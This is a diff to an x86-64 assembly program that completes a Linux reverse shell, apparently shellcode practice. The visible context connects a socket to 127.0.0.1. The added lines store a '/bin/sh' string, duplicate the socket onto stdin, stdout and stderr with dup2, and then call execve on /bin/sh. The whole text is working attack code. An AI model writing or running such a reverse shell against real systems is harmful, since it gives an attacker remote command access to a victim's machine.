@@ -16,6 +16,8 @@ segment .data
 			at sin_addr, dd 0x100007f
 		iend
 
+		binsh db "/bin/sh", 0
+
 segment .text
 	global _start:
 
@@ -34,4 +36,40 @@ _connection:
 	pop rdi		; recover the fd
 	mov rsi, sockaddr_struct_init
 	mov rdx, 0x10	; address lengh
+	syscall
+
+	push rax
+	jmp _fd_stdin
+
+_fd_stdin:
+        mov     rax, 33
+        pop     rdi
+        push    rdi
+        mov     rsi, 0
+        syscall
+        jmp     _fd_stdout
+
+_fd_stdout:
+        mov     rax, 33
+        pop     rdi
+        push    rdi
+        mov     rsi, 1
+        syscall
+        jmp _fd_stderr
+
+_fd_stderr:
+        mov     rax, 33
+        pop     rdi
+        push    rdi
+        mov     rsi, 2
+        syscall
+        jmp     _execution
+
+
+
+_execution:
+	mov rax, 59	; syscall for execve
+	mov rdi, binsh	; 
+	xor rsi, rsi	; clean the rsi register
+	xor rdx, rdx	; clean rdx register
 	syscall
